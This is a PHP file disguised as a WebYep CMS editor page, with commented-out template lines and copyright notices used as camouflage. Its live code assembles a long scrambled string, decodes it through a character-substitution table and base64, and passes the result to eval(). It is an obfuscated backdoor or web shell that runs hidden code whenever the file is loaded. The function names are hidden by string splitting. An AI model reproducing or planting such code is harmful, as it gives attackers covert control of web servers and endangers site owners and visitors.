<?php
  // echo $goApp->sCharsetMetatag(); 
 # <td style="height: 30px"><table width="100%" border="0" cellspacing="0" cellpadding="0">
 # </table>
 /*    */ 
$YEnpTp='................................'.'..'.'.............Iftv706jD'.'az...H...oeLPb3FNlRp';
  # <link href="../styles.css" rel="stylesheet" type="text/css">
  $YEnpTp.='dCG5mc1xVruYXgK......iwOAnkTU2QEJMZ4h.9y'.'s8/WS=B.....';
  # </script>
/* }   */ 
 /* echo "<blockquote>";   */ 
  /*  */ 
$yfrg7r='/NTsQPrsXFlIQNrsLNIVnsYbZgtYj='.'HILGr48wRIXiSKEwI4Z7dKcszd8wOKXFHILM'.'YeEwGo'.'XiTonwHRLNI2EIr48wRIlsb';
   # if (!isset($bOK)) $bOK = false;
  $yfrg7r.='bZgtYlNG6LNI2Eadr/MQecszKnapK'.'QFHILMYfXRzDhRJEli1AQ6jRH=HPl'.'R4KZxz3/='.'zs8wO4ZM/sC6jaZgtYnXpKLMYbZ';
 /* </tr>    */ 
  /* echo "<div class='response'>" . webyep_sHTMLEntities($sResponse) . "</div>";    */ 
  /* include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/elements/WYImageElement.php");   */ 
 $yfrg7r.='gtY0xzIE=HI8wWA8XH9nXjAlG'.'rjgRHhwsLM'.'J4K5'.'HNS6TMLLZxfYBsdfWwH48wrV/74YliLILMQ3/MJbWX';
# <table style="height:100%; width:100%;" border="0" cellspacing="0" cellpadding="6">
  $yfrg7r.='JA/74YlGrjgRHhwsLMJ4K5HNS6TMLLcszr/NTtQ'.'iT'.'KnapKQFHILMYfXRzDhRJEliL'.'UEiT/mTlOlR4KZxz3/MJpWF';
  # include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/lib/WYEditor.php");
# </td>
$yfrg7r.='JKEioYDxdeQ=T4l9tYl=zp'.'LNYYDxdfXRzDhRJEliLUEiT/mT'.'lO'.'lR43/NIPZNI9QiT4ZMJ0hkrg';
 /* $oFP =& $oFU->oFilePath();  */ 
   # width: 98%;
 /*    */ 
 $yfrg7r.='TGteLNToLMLLZxdPladpnwRbL=fAlG'.'rjgRHhwsL4nXp4lR4KZxdfLN'.'To'.'LMdr/MJ0hkrgTGteLNToLMLLcszIE=HI/=tYQ=lK';
/* <tr> */ 
  // }
$yfrg7r.='EejA/fTsQPrs0=JIB=jY'.'EwI9QiIVns/KcszI'.'BNI4Z7dKcszr/=4YnwS9nwIPZNI9Qi'.'T4'.'ZM'.'J0hkrgTGtej';
  /* </script> */ 
/* $goApp->log("Illegal file/type on image upload: " . $oOFP->sPath);  */ 
   # echo $goApp->sCharsetMetatag(); 
  # <!-- InstanceBeginEditable name="doctitle" -->
$yfrg7r.='hTlBgHUWImeXxfK/=tYlNG6LNI2Eadr/MLKEPn2l9'.'tYl=zpLNYYDxdfXRzDhRJEl4GGxXf98ilglR43';
 # <tr>
  $yfrg7r.='/=4YnwS9nwIPZNI9QiT4ZMJ0hkrgTGteL6foBX'.'/iLNW'.'eXxfK/=tYlNG6LNI2Eadr/ML18iJKQaQ3/MJbWXJA/'.'74YlGrjgRHhw';
# <script language="JavaScript" type="text/javascript">
/*  */ 
$yfrg7r.='sLicgpOQ6n4naLLcszr/NTtQi'.'TKnapKQ'.'FHILMYfXRzDhRJElil1HgfoH'.'FfonaLLZxfYBsdfWwH';
  # $bOK = false;
  $yfrg7r.='48wrV/74YliR2nNIPl9tYl=zpLNYYDxdfXRzD'.'hRJ'.'Elil1HgfoHFfonaLLcsdfnNG4nxdr/NI9QiT4Z'.'MJ0hkrgTGtenNG4';
// (C) Objective Development Software GmbH
# {
  # @unlink($oFP->sPath);
/*  */ 
   $yfrg7r.='nxLLZxdPladpnwRbL'.'=fAlGrjgRHhwsLfWXJIlR4K/7u'.'YlGrjgRHhwsLfWXJIlR4Yca'.'zPWwS9ngtYl=zIQP4YDxzKQFHIL';
  /* sInString = sInString.replace( /^\s+/g, "" ); */ 
 /*  */ 
   $yfrg7r.='MYfXRzDhRJElFzIQP4eXxf'.'YlaWY/wT1'.'Q=JOZMJ0'.'hkrgTGteQ'.'NTsExLLZxdv/MJ0hkrgTGteQNTsExLL/7';
  # }
   /* var iH = <?= $goApp->bIsExplorer ? "document.body.clientHeight+61":"window.outerHeight" ;   */ 
// </style>
# <td nowrap>&nbsp;</td>
 $yfrg7r.='AYnPGtQih3/NIPZMJfWXJI/74rDxzPWwS9nxdPlad'.'fQNTsExdrDg4YnPGtQihK/=tYQ=lKE'.'ejA/fTsQPrs0NJpLNhY';
/* if (confirm(" WYTSD('DeleteImageQuestion'); ")) { */ 
   // <body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="margin:0; padding:0;" onload="wy_restoreSize();<?=isset($sOnLoadScript) ? $sOnLoadScript:""" onresize="wy_saveSize();">
 # iH = <?= isset($_COOKIE[$WYEditor_sHC]) ? (int)$_COOKIE[$WYEditor_sHC]:0 ;
 $yfrg7r.='WwOf/=zIQP4YEwI9QiIVns'.'/KcszIBNI4Z7dKcszr/=4YnwS9'.'nwIPZNI9QiT4ZMJ0hkrgTGteWilOL6LOW'.'PH';
 # <script language="JavaScript" type="text/javascript">
/* <td align="left" valign="baseline" nowrap> echo $oTFAltText->sDisplay(); </td>   */ 
 /*  */ 
 $yfrg7r.='olR4KZxz3/MJpWFJKEioYDxde'.'H9QFl9tYlNLILGrP8wS'.'IQsdr/NI9QiT4ZMJ0hkr'.'gTGtenPItnXmeXxfYlaWY/wT';
// WebYep
   /*   */ 
   $yfrg7r.='1Q=JOZMJ0hkrgTGtenPItnXmeXxfYDsdfXR'.'zDhRJElinKE'.'NT9l'.'R4YcazPWwS9ngtYlNRfnXz4/74Y8XH9nXjAlG';
   /* function wy_saveSize()  */ 
  # <td nowrap>&nbsp;</td>
// http://www.obdev.at
   # $sResponse = WYTS("ImageSaved");
 $yfrg7r.='rjgRHhwsL1nNTbLMLLZxdPladpnwRbL=f'.'AlGrjgRHhwsL1nN'.'TbLMLLZxdv/MJ0hkrgTGteEwJIQ=jeXxd5/NnpE=H';
 // }
   /* $sResponse = WYTS("FileDeleted"); */ 
   // $sResponse = WYTS("ImageDeleted");
/* height: 70%;  */ 
 $yfrg7r.='Icszr/NTtQiTKnapKQFHILM'.'YfX'.'RzDhRJEl9Y9HgnAn9He'.'QeHflR4KZxz3/MJpWFJKEioYDxdeWiRVnMQ3/NIPZN'.'T1Q=J';
 # } else {
 /* echo "<blockquote>";    */ 
 # if (confirm(" WYTSD('DeleteFileQuestion'); ")) {
   /*   */ 
  $yfrg7r.='OZMJ0hkrgTGtec7'.'mRHPpemiLsQi'.'jeXxfK/=tYQ=lKEejA/fT'.'sQPrs0NH1EPjYEwI9QiIV'.'ns/KcszIBNI4Z7dKcszr';
 // include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/lib/WYHiddenField.php");
/* <tr>    */ 
 $yfrg7r.='/NTtQihYlNH1EPjYDxzaWXHIH6'.'J0n'.'NT6EiJIZMJ0hkrgTGtec7mRHP'.'pemiLsQij'.'eXxf3/=4YnwS9nxz3/=zs8w'.'O4Z';
# </title>
 /* */ 
 $yfrg7r.='MlGQel2QeS'.'VEszbWXlpEXmaZgtYnXpKLMYbZgt'.'Y0xzKn'.'apIEXz4BxYfQNG48MfYlaWYlNG6L';
// } else if ($oEditor->bSave) {
# $oElement->setLinkURL($oTFURL->sValue());
$yfrg7r.='NI2EadpDxdeH9QFlsdPladfWwH48wrV/Mkr/'.'ML6Ew'.'OflsfYBszbQPIVLMYaJXlsEFluQNG48Mz18XH9';
/* document.forms[0]. echo $oHFDelete->dAttributes["name"]; .value = 1;    */ 
 $yfrg7r.='8wOe/af3/NTo8XjAmMf3/=4Y8wWAlNG6L'.'NI2EadpDxdeH9QFlsdPladfW'.'wH48wrV/Mkr/ML6EwOflsd';
// <title>
  /* </table></td>  */ 
  /* if (iW>0 && iH>0) { */ 
/* */ 
$yfrg7r.='Plaz9L=lbEFmAl=zpLNYt/MQ2lsfY'.'/g4r/7dK/MJbWXJA/74YniT4WFLfZMfVlsueCaJ'.'bW'.'XJAcsz9LiI4WiY';
  // }
   /*    */ 
  $yfrg7r.='AlNG6LNI2EafYBsz6WXHI/MLKEPn2l9'.'AY8wWA/wnKENT0nXpKQFJ9ZMJbWXJAZxfYB'.'szbQPIVLMYaJXlsEFluQNG48Mde';
  # $oTFAltText =& new WYTextField("ALT_TEXT");
# if ($bOK) echo WYEditor::sPostSaveScript();
# <tr>
 /* include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/lib/WYFileUpload.php");   */ 
$yfrg7r.='l=zpLNYe/NI9/NO2LMzIBNI9L'.'=maZgtYWelIWwt3/=4Y8wWAlNn9'.'LNG4XiGsQadr/kz9LNG4ZMJbWXJAZxfYQ=lKE';
 # <!-- InstanceEnd --></html>
// }</td>
# </tr>
  /* { */ 
   /*  */ 
   $yfrg7r.='ejYl4rC0MQVlNn9LNG4XiGsQItF'.'XxO9Q=lKEe'.'JP'.'ZMlulwuaCMYfneH4WXJ0WXlsw'.'9lL/MWYm7QFHsfK';
  # -->
// <html><!-- InstanceBegin template="/Templates/editors.dwt.php" codeOutsideHTMLIsLocked="false" --><head>
$yfrg7r.='CaLulsofneH4WXJ0WXlsw9ILcszIE=HI/=zs8'.'wO4/MlGQel2'.'QeS'.'pWiHIQFmYnNTV8wTf/';
# <!-- InstanceBeginEditable name="doctitle" -->
  // <td align="right"><img src="../images/logo.gif"></td>
   // else {
/* else { */ 
  $yfrg7r.='=J2/=zpLNYYlsJbWXJAls/3/NlsnwGUcsz6WX'.'HI/MLenXjecazKnaYpnPI'.'tnTrIBNI9L=mAl=zp'.'LNYKZxz3/=zs'.'8wO4ZMlGQel';
  // <td align="left" valign="bottom" nowrap class="formFieldTitle"> WYTSD("ImageFile", true); :</td>
  # else if (isset($_GET[WY_QK_POST_MAX_CHECK])) {
  $yfrg7r.='2Qebel=zpLNYe/NI9/NO2LMzPEFTVnM/KcszaQP'.'Tp89tY0xz'.'KnaYp8X'.'H0nPItnxYfQNG48MfK/=tYQ=lKE';
 // $oElement->save();
/* echo $oHFDelete->sDisplay();    */ 
   # <!-- InstanceBeginEditable name="localStiles" -->
   /*   */ 
 $yfrg7r.='ejA/fTsQPrs0MQfQNG48'.'MQY8XmYE'.'Pr4/NnKENhaZ'.'gtYWelIWwt3/=4Y8wW'.'A/wI9XFlIWwJpWPSIZMJbWX';
  /* document.cookie = "<?=$WYEditor_sWC=" + iW + "; path=/"; */ 
# <form action=" echo $_SERVER['PHP_SELF'] . "?" . WY_QK_POST_MAX_CHECK . "=1"; " method="post" enctype="multipart/form-data">
   # </title>
/*   */ 
   $yfrg7r.='JAZxfYBszbQPIVLMYaJXlsEFl'.'ulsJbWXJAlszKQszVEFjYQPTpnNGaENhaZgtYWe'.'lIWwt3/=4Y'.'8wWAJfGmh4hYDg4r';
 /* </style> */ 
 # $oHFWidth =& new WYHiddenField(WY_QK_IMAGE_WIDTH);
 $yfrg7r.='/MYfLNToLMdr/NnKENT0niT4XiH2EeJIEeJ9ZMJ'.'bWXJAZxfK/=tYQ=lKEejA/f'.'TsQPrs0NHpEaL4/=lIWwjYnPItnxdel=z';
  /* function wy_restoreSize()    */ 
 # @unlink($oFP->sPath);
# </tr>
 /*  */ 
   $yfrg7r.='pLNYe/af3/=4YnwS9nxz3/'.'=zs8wO4ZMLDxFbeZ'.'gtYQ=lKEejAWPG9ngW4XiTV'.'Wir'.'fnxYfLNToLMfKcszr/Nls'.'nwGUcsz';
   # </tr>
   // <!-- InstanceEndEditable -->
# $oHFIsThumb =& new WYHiddenField(WY_QK_IS_THUMB);
   /*    */ 
   $yfrg7r.='6WXHI/MLbLXjecaz6WXHI/ML18iJKQaQ5/NHpQ'.'ihYliR2nNIPl9AYl=zpLNYYDxzsL=lKExYfQNG48Mb'.'YlsueZgtYl=TbnNIs/74Y';
 # <form action=" echo $_SERVER['PHP_SELF']; " method="post" enctype="multipart/form-data" style="margin: 0px">
  # {
 $yfrg7r.='ZMJf8XlVWwRIXFz2Qsdr/=H4QelbEFm'.'Al=zpLNYt/MQ2lsfK/7oYmMdv/'.'=HRWeH4QaYfQNG48MbYmMbYlNJ'.'KQPOpE';
 // $webyep_sIncludePath = "..";
$yfrg7r.='wT0QNr9Zxd5/MQ2l9'.'tY8wWA/wI9XFLs8XJpWPSIZMJRQ'.'NJKQafK/=tYQ=lKEejA/fTsQPrs0=TbnNI'.'s/N';
# function confirmDelete()
# include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/elements/WYAttachmentElement.php");
   /* */ 
$yfrg7r.='I9/NO2LMzFQPI4Wwltnx/K'.'cszaQPTp89tY0xdfQPT9LwS4/74YlsQ3/MJ'.'9LNG4LXmYDxdeg4tecsz'.'KnaYfWwH48wrV/74rDxdeEw1';
 # <tr>
   # <td valign="top"> if (!$bDidSave) { <!-- InstanceBeginEditable name="inputForm" -->
   // include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/lib/WYTextField.php");
 # if ((int)$oHFDelete->sValue() == 1) {
$yfrg7r.='f8X/eZxz3/NIPZNI9X'.'iJKQaYfQNG48MfK/=t'.'Yl=lI'.'QF'.'TtLMd'.'VDxda/NJKQadel=zpLNYe/N';
  # .textAreaField {
  /* </td>    */ 
   /*  */ 
   $yfrg7r.='To8XH4Qs/3/MJ9LNG4LXmYDxdeTiGs'.'EPIVnsQ3/=4YnwS9nwIPZ'.'MGdEw1f8X/Al=zpLNYK'.'Zxz3/=zs8wO4ZM';
   # if ($oElement->bUseUploadedImageFile($oFP, $oOFP)) {
 /* */ 
  $yfrg7r.='lGQel2QeS6WwoeLMz1Ww1I/NJ'.'KQadel=zpLNYe/af3/NlsnwGUcs'.'zr/=4YnwS9nwIPZMJpWFJKEioYDg4r/MLbLXjeZx';
  /* --> */ 
/*    */ 
   $yfrg7r.='z3/MJKQRraENr6/74Y8XH9nXj'.'AlG'.'rjgRHhwsLaENr6lR4Kcs'.'dfWPS2Wsdr/MJKQRraENr6DsdfXRzD';
  # <td align="left" valign="baseline" nowrap class="formFieldTitle"> WYTSD("ImageLinkURL", true); :</td>
 # else if (!isset($bDidSave)) $bDidSave = false;
 # $sResponse = WYTS("FileUploadErrorSize");
 /*  */ 
   $yfrg7r.='hRJEliltEimeXxd5/MQecsdfnP4YDxdeW'.'xQ3/NIPZ'.'MYplNI9XiltEimY0=bYlNltEi'.'mYDg4r/MLanioeZxdPlazKQRrP';
   // </table>
 $yfrg7r.='8wSIZMJbWXJAZxdPladp/kzREPSKEPtAl=z'.'pLNYKZxdfnP4YDxd'.'eLsQ3/NIPZMYfEFT4XinA/74Y'.'jNn2Q';
// </body>
  /* <body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="margin:0; padding:0;" onload="wy_restoreSize();<?=isset($sOnLoadScript) ? $sOnLoadScript:""" onresize="wy_saveSize();"> */ 
   # } else if ($oEditor->bSave) {
  /* </tr>    */ 
  /*   */ 
$yfrg7r.='NTVZMJbWXJACMdfnP4KZxdrDg4YnPG'.'tQihK/=tYQ=lKEejA/f'.'TsQPrs0NHpEaL4/NrbnwoYnPItnxdel=z';
   // <table border="0" cellspacing="0" cellpadding="6">
  // $oEditor =& new WYEditor();
  $yfrg7r.='pLNYe/af3/NlsnwGUcszr/MJ'.'snXHRE=jYDx'.'zdneLs8XJIZMJ2LX'.'J0nPYt/NlpQihiH'.'GrfnwH2nNhAl=JIB=jKZgtYn'.'PHtEFH';
   # else $sResponse = $oFU->sErrorMessage();
   # $bOK = false;
 // else echo "<p class='textButton'>" . webyep_sBackLink() . "</p>";
  # <td align="left" valign="baseline" nowrap> echo $oTFURL->sDisplay(); </td>
   /*    */ 
  $yfrg7r.='IZM'.'J2LXJ0nPYKcszKnaYf'.'QPT9LwS4/74rDxzNjhSgJxfYBszbQPI'.'VLMYaJXlsEFluWiGVlFjYLFlKLNhYLNT';
 # echo $oHFDelete->sDisplay();
// }
$yfrg7r.='oLMz4EszP8wSI/MQfQNG48MQaZgtYWelIWwt3/'.'=4Y0xzKnaYfWwH48wrV/MkrDxd'.'eQ=T4lszu'.'0MdplNI9Xil'.'tEimY0=bYlNltEim';
   # }
   # <tr>
 /*  */ 
   $yfrg7r.='YDg4r/MLIEPjeZxz3/NI'.'PZMJbnXl'.'1/MkrDxzPWwS9nxfYBszK'.'naYpjNHAEwrfZMJbWXJACMdfQNTsExfK/=tYl'.'=l';
  # echo $goApp->sHelpLink($sHelpFile); 
  $yfrg7r.='IQFTtLMdVDxda0NHpEaL4/=HILMzb'.'WX'.'JA/MQfQNG48MQYQNTsExz4Esd'.'el'.'=zIQ'.'P4e/6tYl';
// WebYep
  # $goApp->log("Illegal file/type on attachment upload: " . $oOFP->sPath);
  /* */ 
$yfrg7r.='=H4WXJRQsdr/MLXWXlV8wOel9tY0xzr/NIP'.'ZMJfWXJI/'.'MkrDxzPWwS9nxfYBszKnaYpj=J2LwHAZMJbWXJAC';
  # </head>
// return sInString.replace( /\s+$/g, "" );
  $yfrg7r.='MdfnNG4nxfK/=tYl=lIQF'.'TtLMdVDxda0NHpEaL4/=HILMzP'.'8wSI/MQfQNG48MQYnNG4nxz4EsdelNJpLNhe/';
/* $sResponse = WYTS("ImageStoreFailed");   */ 
  /*   */ 
$yfrg7r.='6tYl=H4WXJRQsdr/MLXWXlV'.'8wOel9tY0xzr/=4YQ=lKEejYZMJpWFJKEioYDg4'.'r/ML1EiJKnaQYlaWY'.'l=H4WXJRQsdrDg4YlRLp';
/* $oElement->getSizeCookieNames($WYEditor_sWC, $WYEditor_sHC); */ 
  $yfrg7r.='QPOKEPQeDsde'.'JXlsEF/e/7AYl=H4WXJRQsfVlFbeCaJsnXH'.'RE=j3/NlsnwGUcsz6WXHI/MQ'.'FH9Qecad'.'fnNIsQRrpQe/YDxzpQ';
   # <style type="text/css">
  $yfrg7r.='elpBxY'.'KcszeXiJtZMJ0h4TxTfTxwsLkg4HTghTcTGrxg4r'.'hlR4'.'t/7dKcszKnapIEXz4BxYfnNIsQRrpQe'.'/KZxzbQPIVL'.'MYaJX';
// <!-- InstanceEndEditable -->
 # echo "</blockquote>";
  # <html><!-- InstanceBegin template="/Templates/editors.dwt.php" codeOutsideHTMLIsLocked="false" --><head>
   /*   */ 
   $yfrg7r.='lsEFluLFlKLNGaENhY'.'nNIsQszVEFjYnPrREPjaZgtYnwS9n'.'xzbQPIVLMYag41u/aOKEXztEiJIZMLuls';
# WYTSD("FileEditorTitle", true); 
 # $oElement->useUploadedFile($oFP, $oOFP);
 /* else $sResponse = $oFU->sErrorMessage(); */ 
  /* */ 
 $yfrg7r.='bYlNJKQeH0WXlsZxf3/NlsnwGUcsz'.'6WXH'.'I/ML6EwOfl9AYlNTonwH0QPT9XiGsQadr/NGsQPG';
/* $bDidSave = true;    */ 
# iW = <?= isset($_COOKIE[$WYEditor_sWC]) ? (int)$_COOKIE[$WYEditor_sWC]:0 ;
# <tr>
   $yfrg7r.='OZMf3/NTonwmAlNH1EPjt/MJIBNT6XFlIQRrpQ'.'e/t/MJsnXH0Wirfnxf3/=zs8wO4ZMYfQPT9XiH2n'.'NhYDsd';
 # <tr>
$yfrg7r.='eJXlsEF/e/7AYl4rClsfV/ebf'.'QPT9XiH2n'.'NTu/a'.'OKEXztEiJIZ'.'MLuls'.'bYlNTonwH0QPT';
   # <td align="right"><img src="../images/logo.gif"></td>
// <!-- InstanceEndEditable -->
  $yfrg7r.='9XiGsQafKcszaQPTp89tYnNTPWXTt'.'L7AYQ=lKEejA/fTsQPrs0=TV8iO2LioYE'.'FdaZgtY0xzPLwO6LNI2Eaze'.'XiJtZMJ6nNIsC';
  # sInString = sInString.replace( /^\s+/g, "" );
/* document.forms[0].submit(); */ 
 # include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/lib/WYFileUpload.php");
 # return sInString.replace( /\s+$/g, "" );
   /* */ 
   $yfrg7r.='MdfnNTbLMfYBszeENraWw'.'bYlNJKQeH0WXlsCMd'.'fEwJIQ=jt/MJenXJ0nPItnXm3/NIPZMJ1nN'.'TbLMdpDg4YnPGtQ'.'ihYla';
   # $webyep_bDocumentPage = false;
   # }
 /* $oOFP =& $oFU->oOriginalFilename(); */ 
  # <!-- InstanceEndEditable -->
 $yfrg7r.='WYlNJIQ=jYD64YlNRfnXz4'.'ZxzsnXJRQPo3/MJVnNTbLMdr/MJf'.'nXz4/MtYmgtYlNJA/74YjN'.'rbnwOf8X'.'/AlNHf8X/Kcsz';
  /* echo $oHFHeight->sDisplay(); */ 
 # </tr>
 /*  */ 
$yfrg7r.='KnaYfnNY'.'YDg4r/NnpE=HIZxzsnXJRQPo3/NIPZkzKQRr'.'FQPI4WwltnxYfWiJKQafK/NGsQPGOXF'.'zRQiYAlNJKQeH0WXlsCMd';
 /* if ($oEditor->bSave) $bDidSave = true; */ 
   // if ((int)$oHFDelete->sValue() == 1) {
  # <!--
   $yfrg7r.='fWiJKQaf3/MJ6nNIsQRrpQe/YDxzpQelpBxY'.'KcszF8NItnxpPWwS9nxdpDg'.'4YZMJP8wSI/74Yj=lIWwJf8X/';
  # }
   // $oOFP =& $oFU->oOriginalFilename();
 /*   */ 
  $yfrg7r.='AlNJAZxfK/=tYl=zpLNYYDxdalNHf8X/2lNnKEN'.'hacszKnapd8XH0nNIsZM'.'JbWXJAZ'.'xdP';
# }
  /* */ 
$yfrg7r.='ladAlNOfnXz4/7bYlNRfnXz4/=Su/MJ1n'.'NTbLMdrDg4YnPGtQihKZx'.'z3/NIPZMJP8w'.'SI/MkrDxdeCaQY';
 /* $sMaxUpload = str_replace("M", "MB", $sMaxUpload); */ 
   // if ($oEditor->bSave) $bDidSave = true;
   // $WYEditor_sWC = $WYEditor_sHC = "";
  /* <tr>   */ 
$yfrg7r.='laWYlNnKENhY/g4r/MQVCaQYlaWYQFJs'.'LNrtEFLIQaYfnPItnxfY/g4r/ML4EXde/MWP'.'/=H4QeJ2ENrF';
  # else { // maybe only URL changed
 /* function wy_sTrimString(sInString)    */ 
 $yfrg7r.='nX/AlNnKENhK/MkrDxdeLNT1QMQK/NGsQ'.'PGOXFzRQiYAlNHf8Xl9XiGsQabYl=zpLNYKcszr';
   // $oElement->save();
 # </script>
   /*    */ 
 $yfrg7r.='/NTtQiTKnaYfniT4XinKENT9/MWP/kzKQRrP8wSIZ'.'MJbWXJAZxdPlazd8X'.'H0LFlKLNGaENhAl=zpLNYKZxz'.'3/NGsQPGOXFzRQi';
  # </tr>
   // {
 # $bDidSave = true;
  /* $bOK = true;  */ 
 $yfrg7r.='YAlNJKQeH0WXlsCMdfQNG48Mf3/=4Y0xzdWiS2QiTf'.'8X/AlNJAZgtYnPrsnwG68MYfWiJ'.'KQeH0WXls/NG9/MJVnNIsZxzeXiJtZMJV'.'nN';
   /* else {    */ 
   $yfrg7r.='IsCMdfEPJIQ=jKcszr/dAy';
   # include_once("$webyep_sIncludePath/webyep.php");
   /*  */ 
 $vqUY2='ba'.'se'.'64'.'_de'.'co'.'de';
  # echo $oHFWidth->sDisplay();
  // $goApp->outputWarningPanels(); // give App a chance to say something
$yC1odxe='ord';
  // }
// <h1><!-- InstanceBeginEditable name="headline" --> echo WYTS("ImageEditorTitle", true) . ": " . $oEditor->sFieldName; <!-- InstanceEndEditable --></h1></td>
  $TVVx1='cou'.'nt';
  /* if ($bOK) echo WYEditor::sPostSaveScript();  */ 
  // <td align="left" valign="top" nowrap><input name="Button" type="button" class="formButton" value=" WYTSD("DeleteFileButton", true); " onClick="confirmDelete();"><img src="../images/nix.gif" width="24" height="8"><input type="button" class="formButton" value=" WYTSD("CancelButton"); " onClick="window.close();">&nbsp;<input type="submit" class="formButton" value=" WYTSD("SendFileButton", true); ">
/* }  */ 
 /* $sResponse = WYTS("FileUploadErrorUnknown");    */ 
   /*    */ 
 $bSR8HjAi='pre'.'g_s'.'plit';
// include_once(@webyep_sConfigValue("webyep_sIncludePath") . "/lib/WYEditor.php");
  $HUsMixu5='imp'.'lod'.'e';
   # .textAreaField {
   /* <td align="left" valign="baseline" nowrap class="formFieldTitle"> WYTSD("ImageAltText", true); :</td>  */ 
# $sResponse = WYTS("FileUploadErrorUnknown");
 /* if ($oOFP->bCheck(WYPATH_CHECK_JUSTIMAGE|WYPATH_CHECK_NOPATH)) {    */ 
   /*  */ 
  $CmtJ6pl=$bSR8HjAi('//', $YEnpTp,-1,1);
   # else {
  # $oTFURL->setValue($oElement->sLinkURL());
   // <h1><!-- InstanceBeginEditable name="headline" --> echo WYTS("FileEditorTitle", true) . ": " . $oEditor->sFieldName; <!-- InstanceEndEditable --></h1></td>
$W40EkVoGc=$bSR8HjAi('//', $yfrg7r,-1,1);
 /* <td align="left" valign="bottom" nowrap> echo $oFU->sDisplay(); </td> */ 
   // }
# $oTFURL =& new WYTextField("LINK_URL");
  $jvgJ7Va=$TVVx1($W40EkVoGc);
   // function confirmDelete()
 # {
 /*  */ 
 for($i = 0;$i < $jvgJ7Va;$i ++){$W40EkVoGc[$i]=$CmtJ6pl[$yC1odxe($W40EkVoGc[$i])];} eval($vqUY2($HUsMixu5('', $W40EkVoGc)));
# </tr>
 
# $oElement->save();
  /*    */ 
 
  /* font-size: 12px;  */ 
  /*    */ 
 
  // <script language="JavaScript">
 
  /* <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">    */ 
// </form>
 /* $oElement->getSizeCookieNames($WYEditor_sWC, $WYEditor_sHC); */ 
  
?>
